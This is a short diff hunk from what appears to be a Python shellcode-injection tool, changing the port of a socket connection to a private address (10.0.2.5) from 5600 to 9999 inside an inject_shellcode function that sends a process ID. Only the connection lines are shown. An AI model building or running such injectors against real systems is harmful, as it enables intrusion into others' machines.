@@ -40,7 +40,7 @@ shellcode = (
 
 def inject_shellcode(pid):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('10.0.2.5', 5600))
+    s.connect(('10.0.2.5', 9999))
 
     s.send(str(pid))
 
